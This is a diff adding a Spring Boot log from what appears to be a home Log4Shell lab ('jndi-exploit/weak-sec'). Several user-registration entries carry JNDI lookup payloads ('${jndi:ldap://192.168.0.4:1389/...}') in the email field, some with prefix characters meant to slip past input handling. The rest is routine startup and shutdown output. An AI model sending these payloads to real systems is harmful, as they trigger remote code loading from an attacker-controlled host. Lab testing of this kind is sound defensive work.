@@ -1,0 +1,205 @@
+2022-02-16 00:13:46.575  INFO 34456 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 34456 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 00:13:46.583 DEBUG 34456 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 00:13:46.584  INFO 34456 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 00:13:46.625  INFO 34456 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 00:13:46.626  INFO 34456 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 00:13:47.164  INFO 34456 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 00:13:47.206  INFO 34456 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 34 ms. Found 1 JPA repository interfaces.
+2022-02-16 00:13:47.664  INFO 34456 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 00:13:47.766  INFO 34456 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1139 ms
+2022-02-16 00:13:47.876  INFO 34456 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 00:13:47.967  INFO 34456 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 00:13:48.009  INFO 34456 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 00:13:48.109  INFO 34456 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 00:13:48.197  INFO 34456 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 00:13:48.591  INFO 34456 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2022-02-16 00:13:48.597  INFO 34456 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 00:13:48.804  WARN 34456 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 00:13:48.938  INFO 34456 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 00:13:49.052  WARN 34456 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : Unable to start LiveReload server
+2022-02-16 00:13:49.101  INFO 34456 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 00:13:49.111  INFO 34456 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.92 seconds (JVM running for 3.918)
+2022-02-16 00:14:19.709  INFO 34456 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 00:14:19.711  INFO 34456 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
+2022-02-16 00:16:12.055  INFO 34456 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 00:16:12.056  INFO 34456 --- [SpringApplicationShutdownHook] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
+2022-02-16 00:16:12.277  WARN 34456 --- [SpringApplicationShutdownHook] o.s.b.f.s.DisposableBeanAdapter          : Invocation of destroy method failed on bean with name 'inMemoryDatabaseShutdownExecutor': org.h2.jdbc.JdbcSQLNonTransientConnectionException: Database is already closed (to disable automatic closing at VM shutdown, add ";DB_CLOSE_ON_EXIT=FALSE" to the db URL) [90121-200]
+2022-02-16 00:16:17.261  INFO 9308 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 9308 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 00:16:17.269 DEBUG 9308 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 00:16:17.271  INFO 9308 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 00:16:17.316  INFO 9308 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 00:16:17.316  INFO 9308 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 00:16:17.817  INFO 9308 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 00:16:17.857  INFO 9308 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 31 ms. Found 1 JPA repository interfaces.
+2022-02-16 00:16:18.285  INFO 9308 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 00:16:18.390  INFO 9308 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1073 ms
+2022-02-16 00:16:18.489  INFO 9308 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 00:16:18.589  INFO 9308 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 00:16:18.644  INFO 9308 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 00:16:18.772  INFO 9308 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 00:16:18.866  INFO 9308 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 00:16:19.306  INFO 9308 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2022-02-16 00:16:19.313  INFO 9308 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 00:16:19.508  WARN 9308 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 00:16:19.645  INFO 9308 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 00:16:19.759  WARN 9308 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : Unable to start LiveReload server
+2022-02-16 00:16:19.814  INFO 9308 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 00:16:19.824  INFO 9308 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.991 seconds (JVM running for 3.926)
+2022-02-16 00:16:32.655  INFO 9308 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 00:16:32.656  INFO 9308 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 0 ms
+2022-02-16 00:16:47.320  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 00:16:47.322  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: jack
+2022-02-16 00:16:47.323  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: jack@domain.com
+2022-02-16 00:18:36.222  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 00:18:36.222  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : Username: john
+2022-02-16 00:18:36.223  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : Email: ${jndi:ldap://192.168.0.4:1389/eo3pul}
+2022-02-16 00:20:22.669  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 00:20:22.670  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: johnny
+2022-02-16 00:20:22.670  INFO 9308 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: ${jndi:ldap://192.168.0.4:1389/eo3pul}
+2022-02-16 00:25:35.555  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 00:25:35.555  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : Username: joe
+2022-02-16 00:25:35.556  INFO 9308 --- [http-nio-3000-exec-9] m.h.w.c.UserController                   : Email: joe@domain.com
+2022-02-16 00:38:09.847  INFO 9308 --- [http-nio-3000-exec-7] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 00:38:09.847  INFO 9308 --- [http-nio-3000-exec-7] m.h.w.c.UserController                   : Username: Jack
+2022-02-16 00:38:09.847  INFO 9308 --- [http-nio-3000-exec-7] m.h.w.c.UserController                   : Email: jackie@domain.com
+2022-02-16 01:24:16.903  INFO 9308 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 01:24:16.911  INFO 9308 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : Username: james
+2022-02-16 01:24:16.911  INFO 9308 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : Email: james@bond.com;" ${jndi:ldap://192.168.0.4:1389/eo3pul}
+2022-02-16 17:36:58.057  INFO 9308 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:36:58.082  INFO 9308 --- [SpringApplicationShutdownHook] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
+2022-02-16 17:36:58.428  WARN 9308 --- [SpringApplicationShutdownHook] o.s.b.f.s.DisposableBeanAdapter          : Invocation of destroy method failed on bean with name 'inMemoryDatabaseShutdownExecutor': org.h2.jdbc.JdbcSQLNonTransientConnectionException: Database is already closed (to disable automatic closing at VM shutdown, add ";DB_CLOSE_ON_EXIT=FALSE" to the db URL) [90121-200]
+2022-02-16 17:38:04.814  INFO 22172 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 22172 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 17:38:04.820 DEBUG 22172 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 17:38:04.820  INFO 22172 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 17:38:04.857  INFO 22172 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 17:38:04.857  INFO 22172 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 17:38:05.360  INFO 22172 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 17:38:05.399  INFO 22172 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 32 ms. Found 1 JPA repository interfaces.
+2022-02-16 17:38:05.861  INFO 22172 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 17:38:05.955  INFO 22172 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1097 ms
+2022-02-16 17:38:06.070  INFO 22172 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 17:38:06.174  INFO 22172 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 17:38:06.229  INFO 22172 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 17:38:06.351  INFO 22172 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 17:38:06.458  INFO 22172 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 17:38:06.867  INFO 22172 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2022-02-16 17:38:06.872  INFO 22172 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:38:07.062  WARN 22172 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 17:38:07.196  INFO 22172 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 17:38:07.309  INFO 22172 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2022-02-16 17:38:07.352  INFO 22172 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 17:38:07.360  INFO 22172 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.918 seconds (JVM running for 3.942)
+2022-02-16 17:38:26.303  INFO 22172 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 17:38:26.305  INFO 22172 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
+2022-02-16 17:39:15.529  INFO 22172 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 17:39:15.531  INFO 22172 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: Jackie
+2022-02-16 17:39:15.531  INFO 22172 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: ${jndi:ldap://192.168.0.4:1389/pdbxss}
+2022-02-16 17:40:12.509  INFO 22172 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:40:12.509  INFO 22172 --- [SpringApplicationShutdownHook] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
+2022-02-16 17:40:12.727  WARN 22172 --- [SpringApplicationShutdownHook] o.s.b.f.s.DisposableBeanAdapter          : Invocation of destroy method failed on bean with name 'inMemoryDatabaseShutdownExecutor': org.h2.jdbc.JdbcSQLNonTransientConnectionException: Database is already closed (to disable automatic closing at VM shutdown, add ";DB_CLOSE_ON_EXIT=FALSE" to the db URL) [90121-200]
+2022-02-16 17:40:25.209  INFO 27144 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 27144 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 17:40:25.215 DEBUG 27144 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 17:40:25.216  INFO 27144 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 17:40:25.249  INFO 27144 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 17:40:25.249  INFO 27144 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 17:40:25.688  INFO 27144 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 17:40:25.728  INFO 27144 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 32 ms. Found 1 JPA repository interfaces.
+2022-02-16 17:40:26.112  INFO 27144 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 17:40:26.204  INFO 27144 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 954 ms
+2022-02-16 17:40:26.295  INFO 27144 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 17:40:26.388  INFO 27144 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 17:40:26.439  INFO 27144 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 17:40:26.556  INFO 27144 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 17:40:26.648  INFO 27144 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 17:40:27.056  INFO 27144 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2022-02-16 17:40:27.062  INFO 27144 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:40:27.231  WARN 27144 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 17:40:27.354  INFO 27144 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 17:40:27.451  INFO 27144 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2022-02-16 17:40:27.494  INFO 27144 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 17:40:27.503  INFO 27144 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.656 seconds (JVM running for 3.527)
+2022-02-16 17:40:38.375  INFO 27144 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 17:40:38.376  INFO 27144 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
+2022-02-16 17:41:18.000  INFO 27144 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 17:41:18.002  INFO 27144 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 17:41:18.002  INFO 27144 --- [http-nio-3000-exec-4] m.h.w.c.UserController                   : Email: )) ${jndi:ldap://192.168.0.4:1389/pdbxss}
+2022-02-16 17:49:26.738  INFO 27144 --- [http-nio-3000-exec-3] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 17:49:26.739  INFO 27144 --- [http-nio-3000-exec-3] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 17:49:26.739  INFO 27144 --- [http-nio-3000-exec-3] m.h.w.c.UserController                   : Email: jackie@chan.com
+2022-02-16 17:57:12.671  INFO 27144 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:57:12.672  INFO 27144 --- [SpringApplicationShutdownHook] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
+2022-02-16 17:57:12.888  WARN 27144 --- [SpringApplicationShutdownHook] o.s.b.f.s.DisposableBeanAdapter          : Invocation of destroy method failed on bean with name 'inMemoryDatabaseShutdownExecutor': org.h2.jdbc.JdbcSQLNonTransientConnectionException: Database is already closed (to disable automatic closing at VM shutdown, add ";DB_CLOSE_ON_EXIT=FALSE" to the db URL) [90121-200]
+2022-02-16 17:57:17.648  INFO 25896 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 25896 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 17:57:17.655 DEBUG 25896 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 17:57:17.655  INFO 25896 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 17:57:17.687  INFO 25896 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 17:57:17.688  INFO 25896 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 17:57:18.154  INFO 25896 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 17:57:18.190  INFO 25896 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 29 ms. Found 1 JPA repository interfaces.
+2022-02-16 17:57:18.585  INFO 25896 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 17:57:18.679  INFO 25896 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 991 ms
+2022-02-16 17:57:18.800  INFO 25896 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 17:57:18.903  INFO 25896 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 17:57:18.956  INFO 25896 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 17:57:19.085  INFO 25896 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 17:57:19.178  INFO 25896 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 17:57:19.607  INFO 25896 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2022-02-16 17:57:19.613  INFO 25896 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 17:57:19.793  WARN 25896 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2022-02-16 17:57:19.915  INFO 25896 --- [restartedMain] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page template: index
+2022-02-16 17:57:20.017  INFO 25896 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2022-02-16 17:57:20.058  INFO 25896 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 3000 (http) with context path ''
+2022-02-16 17:57:20.065  INFO 25896 --- [restartedMain] m.h.w.WeakSecApplication                 : Started WeakSecApplication in 2.755 seconds (JVM running for 3.605)
+2022-02-16 17:57:42.320  INFO 25896 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
+2022-02-16 17:57:42.321  INFO 25896 --- [http-nio-3000-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
+2022-02-16 17:58:22.708  INFO 25896 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : New User Created: 
+2022-02-16 17:58:22.710  INFO 25896 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : Username: jackie
+2022-02-16 17:58:22.710  INFO 25896 --- [http-nio-3000-exec-2] m.h.w.c.UserController                   : Email: ${jndi:ldap://192.168.0.4:1389/pdbxss}
+2022-02-16 18:09:35.448  INFO 25896 --- [SpringApplicationShutdownHook] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2022-02-16 18:09:35.449  INFO 25896 --- [SpringApplicationShutdownHook] .SchemaDropperImpl$DelayedDropActionImpl : HHH000477: Starting delayed evictData of schema as part of SessionFactory shut-down'
+2022-02-16 18:09:35.670  WARN 25896 --- [SpringApplicationShutdownHook] o.s.b.f.s.DisposableBeanAdapter          : Invocation of destroy method failed on bean with name 'inMemoryDatabaseShutdownExecutor': org.h2.jdbc.JdbcSQLNonTransientConnectionException: Database is already closed (to disable automatic closing at VM shutdown, add ";DB_CLOSE_ON_EXIT=FALSE" to the db URL) [90121-200]
+2022-02-16 18:10:37.313  INFO 40948 --- [restartedMain] m.h.w.WeakSecApplication                 : Starting WeakSecApplication using Java 17.0.1 on DESKTOP-GJKS8D0 with PID 40948 (C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec\target\classes started by jackp in C:\Users\jackp\Codes\Java\jndi-exploit\weak-sec)
+2022-02-16 18:10:37.318 DEBUG 40948 --- [restartedMain] m.h.w.WeakSecApplication                 : Running with Spring Boot v2.6.3, Spring v5.3.15
+2022-02-16 18:10:37.319  INFO 40948 --- [restartedMain] m.h.w.WeakSecApplication                 : No active profile set, falling back to default profiles: default
+2022-02-16 18:10:37.360  INFO 40948 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : Devtools property defaults active! Set 'spring.devtools.add-properties' to 'false' to disable
+2022-02-16 18:10:37.360  INFO 40948 --- [restartedMain] .e.DevToolsPropertyDefaultsPostProcessor : For additional web related logging consider setting the 'logging.level.web' property to 'DEBUG'
+2022-02-16 18:10:37.810  INFO 40948 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2022-02-16 18:10:37.844  INFO 40948 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 27 ms. Found 1 JPA repository interfaces.
+2022-02-16 18:10:38.240  INFO 40948 --- [restartedMain] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 3000 (http)
+2022-02-16 18:10:38.329  INFO 40948 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 969 ms
+2022-02-16 18:10:38.442  INFO 40948 --- [restartedMain] o.s.b.a.h.H2ConsoleAutoConfiguration     : H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:highjackdb'
+2022-02-16 18:10:38.551  INFO 40948 --- [restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [name: default]
+2022-02-16 18:10:38.589  INFO 40948 --- [restartedMain] o.h.Version                              : HHH000412: Hibernate ORM core version 5.6.4.Final
+2022-02-16 18:10:38.683  INFO 40948 --- [restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
+2022-02-16 18:10:38.762  INFO 40948 --- [restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
+2022-02-16 18:10:39.124  INFO 40948 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
